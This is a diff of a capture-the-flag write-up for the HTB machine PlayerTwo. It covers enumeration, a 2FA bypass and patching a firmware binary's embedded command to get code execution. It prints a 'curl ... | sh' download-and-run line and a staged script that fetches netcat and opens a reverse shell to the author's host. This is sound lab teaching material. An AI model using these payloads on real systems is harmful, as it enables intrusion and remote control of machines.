@@ -10,14 +10,14 @@ An Insane difficulty Linux machine that tested my web skills a lot...&lt;more&gt
 
 #### Adding a hostname to the hosts file on Linux
 
-In order to get the intended page for a server, sometimes you need to direct your traffic to the site's FQDN rather than it's IP address.  In order to do this you will need to tell your computer where to find that domain by adding the following line to `/etc/hosts` .   Subdomains need to be added on separate lines.
+In order to get the intended page for a server, sometimes you may need to direct your traffic to the site's FQDN rather than it's IP address.  In order to do this you will need to tell your computer where to find that domain by adding the following line to `/etc/hosts` .   Subdomains need to be added on separate lines.
 
 ```text
 10.10.10.170    <domain.name>
 10.10.10.170    <subdomain.domain.name>
 ```
 
-#### Using `cewl` to get a customized wordlist
+#### Using `cewl` to get a site-customized wordlist
 
 ```text
 cewl -d 3 -o -a -e -w <output_file> <website_url>
@@ -32,6 +32,16 @@ wfuzz -X GET -w <wordlist> --sc 200  -c http://player2.htb/proto/FUZZ.proto
 ```
 
 The options used here are: `-X GET` specifies the HTTP command to use, `-w <filename>` specifies which wordlist to use, `--sc 200` tells it to only list HTTP replies that return a code of 200, and `-c` makes the output easier to read with colors.  The command ends with the URL to enumerate, and will substitute any section in the URL where the word `FUZZ` is inserted with each word from the wordlist.
+
+#### Upgrading from a limited shell
+
+After getting a rough shell on the machine, my first order of business is usually moving to a more comfortable shell with all of the creature comforts such as history, tab auto-completion, and the ability to use the arrow keys and `alt-` and `ctrl-` commands.
+
+1. Make sure python is installed with `which python`
+2. Use a python one-liner to spawn a `bash` shell with `python -c 'import pty;pty.spawn("/bin/bash")';`
+3. Background the shell and return to my machine with ```ctrl-z```
+4. Type `stty raw -echo;` to allow sending of raw keyboard input through the pty.  This lets me use `ctrl-c` to kill commands on the other side rather than kill my shell \(for example\).  
+5. Type `fg` to bring my shell back to the foreground
 
 ## Enumeration
 
@@ -401,49 +411,70 @@ Content-Type: application/json
 
 I had my 2FA code!  I used this code on the `/totp` page and was greeted with the page at [http://product.player2.htb/protobs/](http://product.player2.htb/protobs/).  
 
+### The internal protobs page
+
 ![](../.gitbook/assets/8-protobs-after2fa.png)
 
 Since it was the name of the product, my first instinct was to test and see if there was a page at http://product.player2.htb/protobs.  
 
 ![](../.gitbook/assets/11-protobs-uploader.png)
 
-Yep.  Lucky guess again.  It seems that you can upload files to go through some sort of verification, which leads to the page [http://product.player2.htb/protobs/verify](http://product.player2.htb/protobs/verify).  I tried uploading a PHP reverse shell, but it just led to a blank white page and did not send me a shell.  After experimenting with various file uploads and testing for command injection and other things I moved on to explore the rest of the `/home` page.
+Yep.  Lucky guess again.  It seemed that I can upload files to go through some sort of verification, which redirected to the page [http://product.player2.htb/protobs/verify](http://product.player2.htb/protobs/verify).  I tried uploading a PHP reverse shell, but it just led to a blank white page and did not send me a shell.  After experimenting with various file uploads and testing for command injection and other things I moved on to explore the rest of the `/home` page.
 
 ![](../.gitbook/assets/12-protobs-pdf_link.jpg)
 
-looking around more found pdf at [http://product.player2.htb/protobs.pdf](http://product.player2.htb/protobs.pdf) has links to firmware download and verify page \(link hard to see above\)
+After searching around the site for awhile, I found a very hard to see link under the heading "Get an early access to Protobs".  The background was animated and the explosion kept obscuring the text.  In the screenshot above I have my mouse hovering over the link \(see the url in the bottom right corner\).  Clicking on this link gave me a pdf at [http://product.player2.htb/protobs.pdf](http://product.player2.htb/protobs.pdf).  
 
-protobs.bin 
+![](../.gitbook/assets/17-protobs-pdf.png)
+
+This document describes the firmware verification process, which is likely what is happening at the `/verify` page I found earlier.
+
+![](../.gitbook/assets/18-protobs-pdf2.png)
+
+ The last page in the PDF confirms this.  It looks like Protobs developers can use the `/protobs/verify` page to test out their firmware before pushing it to customers.  I downloaded the firmware file, and unzipped it.  Inside was an `info` file with copyright information, a `version` file with versioning information, and the `protobs.bin` firmware file.  
+
+### Protobs.bin
+
+Running the `file` command against the `Protobs.bin` file shows that it is just data.
 
 ```text
 zweilos@kalimaa:~/htb/playertwo$ file Protobs.bin 
 Protobs.bin: data
 ```
 
-opened in ghex...niticed ELF header starts well into the file...whats at the beginning? cut that part out and opened in ghidra saw a string in the ELF that looks like a shell command. If I can replace this with my own command could possibly get code execution on the remote server. searching how to replace a section of code in the elf [https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file](https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file) leads to: [https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd](https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd)
+However, opening the file in GHex, I can see an ELF header, meaning this is a Linux executable with some data stuffed at the beginning \(most likely the verification signature\).  
 
-cheating using GHex! insert this into bin file &gt; left file as-is, just replaced current command with `curl 10.10.15.20:8090/a | sh`
+![](../.gitbook/assets/19-protobs-ghex.png)
 
-my staged payload:
+While browsing through the file, I saw a string in the ELF that looks suspiciously like a shell command: `stty raw -echo min 0 time 10`. Since this command was placed in the program as a plain string, perhaps I could replace it with my own command and could possibly get code execution on the remote server. 
+
+### Researching how to replace a section of code inside an ELF executable
+
+I did some research into how to replace a section of code in the ELF, and came up with [https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file](https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file).  This in turn led to: [https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd](https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd).  Using strings to determine the byte offset of the code to replace, then using `dd` it is possible to replace arbitrary code.  However, it seemed to me as if all they were doing was some fancy cut and paste.  
+
+I knew from previous experience from doing CTFs that you could modify the hex code of a file \(and by extension the ASCII strings they represent\) almost as easily as using a regular text editor.  I decided to try "cheating" a bit using GHex. I selected the string I wanted to replace, and wrote my own commands in its place.  I kept it as simple as possible since I didn't know what kind of checks the verification would do, and decided to create a staged payload. I wanted this program to download a script that would be hosted on my local python SimpleHTTPServer.  My code read:`curl 10.10.15.20:8090/a | sh` .  This would download my script and then execute it using `sh`.  _I would have used bash, but nearly every Linux box is guaranteed to have `sh` or at least something aliased to it, and this also saved me a couple characters!_  
 
 ```text
 #!/bin/sh
-curl 10.10.15.20:8090/nc -o /dev/shm/nc
-chmod +x /dev/shm/nc
-/dev/shm/nc 10.10.15.20 12345 -e /bin/sh
+#get netcat in case remote system can't '-e'
+curl 10.10.15.20:8090/nc -o /dev/shm/nc 
+#make netcat executable
+chmod +x /dev/shm/nc 
+#use netcat reverse shell
+/dev/shm/nc 10.10.15.20 12345 -e /bin/sh 
 ```
 
-between days my ip changed so I had two re-write my payloads...
+Once my script executed, it would then reach back and download netcat \(in case the version on the machine did not have `-e` capability\).  After that it made `nc` executable and created a reverse shell back to my computer which was waiting to catch it.  
+
+![](../.gitbook/assets/16-got-shell%20%281%29.png)
 
 ## Road to User
 
+### Upgrading to a usable shell
+
+After getting a rough shell on the machine, my first order of business was moving to a more comfortable shell with all of the creature comforts such as history, tab auto-completion, and the ability to use non-character keys \(such as the arrow keys\).
+
 ```text
-zweilos@kalimaa:~/htb/playertwo$ nc -lvnp 12345
-listening on [any] 12345 ...
-connect to [10.10.15.20] from (UNKNOWN) [10.10.10.170] 37418
-whoami && hostname
-www-data
-player2
 which python
 /usr/bin/python
 python -c 'import pty;pty.spawn("/bin/bash")';
@@ -451,6 +482,18 @@ www-data@player2:/var/www/product/protobs$ ^Z
 [1]+  Stopped                 nc -lvnp 12345
 zweilos@kalimaa:~/htb/playertwo$ stty raw -echo;
 zweilos@kalimaa:~/htb/playertwo$ fg
+```
+
+First I made sure that python was installed, then upgraded from a limited shell to a more useful one in just a few steps:
+
+1. Use a python one-liner to spawn a `bash` shell with `python -c 'import pty;pty.spawn("/bin/bash")';`
+2. Background the shell and return to my machine with ```ctrl-z```
+3. Type `stty raw -echo;` to allow sending of raw keyboard input through the pty.  This lets me use `ctrl-c` to kill commands on the other side rather than kill my shell \(for example\).  
+4. Type `fg` to bring my shell back to the foreground
+
+### Enumerating as `www-data`
+
+```text
 
 www-data@player2:/var/www/product/protobs$ ls -la
 total 48
@@ -467,13 +510,7 @@ drwxrwxrwx 2 www-data www-data 4096 Jun 25 02:54 uploads
 -rwxr-xr-x 1 www-data www-data  837 Dec  1  2019 verify_signature.py
 ```
 
-```text
-www-data@player2:/home$ ls -la
-total 12
-drwxr-xr-x  3 root     root     4096 Jul 27  2019 .
-drwxr-xr-x 23 root     root     4096 Sep  5  2019 ..
-drwxr-xr-x  6 observer observer 4096 Nov 16  2019 observer
-```
+Next I checked for any password-less sudo permissions with `sudo -l` but there weren't any.  A quick check of the directory I was in showed the back-side code for the website.  
 
 ```text
 www-data@player2:/home$ cat /etc/passwd
@@ -513,21 +550,17 @@ mosquitto:x:112:115::/var/lib/mosquitto:/usr/sbin/nologin
 egre55:x:1001:1001::/home/egre55:/bin/sh
 ```
 
-hmm egre55 user home folder wasn't visible to me; root, egre55, and observer can log in
-
-from ps aux
+A look inside `/etc/passwd` shows three users that can login: `root`, `egre55`, and `observer` .
 
 ```text
-/usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf
-  1177 ?        Ssl    0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unat
-  1178 ?        Ss     0:00 /usr/sbin/apache2 -k start
-  1225 ?        Sl     0:09 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/
-  1527 ?        S      0:00 /usr/sbin/CRON -f
-  1535 ?        Ss     0:00 /bin/dash -p -c sudo -u egre55 -s /bin/sh -c "/usr/b
-  1541 ?        S      0:00 sudo -u egre55 -s /bin/sh -c /usr/bin/php -S 0.0.0.0
+www-data@player2:/home$ ls -la
+total 12
+drwxr-xr-x  3 root     root     4096 Jul 27  2019 .
+drwxr-xr-x 23 root     root     4096 Sep  5  2019 ..
+drwxr-xr-x  6 observer observer 4096 Nov 16  2019 observer
 ```
 
-unfortunately output is cut off...wait...dont be dumb... sent to file and not cut off lol
+However, the user `egre55` user home folder wasn't visible to me, even though it is specified in `/etc/passwd`.  Looks like `observer` is the most likely avenue for privilege escalation.  
 
 ```text
 mosquit+   1164  0.0  0.2  48024  5792 ?        S    Jun24   0:05 /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf
